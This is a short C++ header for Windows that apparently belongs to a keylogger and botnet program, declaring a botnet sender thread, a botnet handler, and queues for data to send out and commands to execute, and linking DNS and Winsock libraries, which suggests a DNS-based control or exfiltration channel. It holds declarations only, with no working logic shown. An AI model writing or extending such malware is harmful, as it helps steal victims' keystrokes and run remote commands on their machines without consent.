#pragma once
#include <string>
#include <windows.h>
#include <queue>
#include <mutex>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

DWORD WINAPI senderBotnetThread(LPVOID lpParam);
DWORD handle_botnet(LPVOID lpParam);
void EnqueueSend(const std::string& s);
void EnqueueExecute(const std::string& s);

// Use packetNumber from KeyLogger.h for consistency
inline std::queue<std::string> send_queue;
inline std::mutex queue_mutex;
inline std::queue<std::string> execute_queue;
inline std::mutex execute_mutex;
inline bool should_stop_sender = false;
constexpr int max_len = 60;
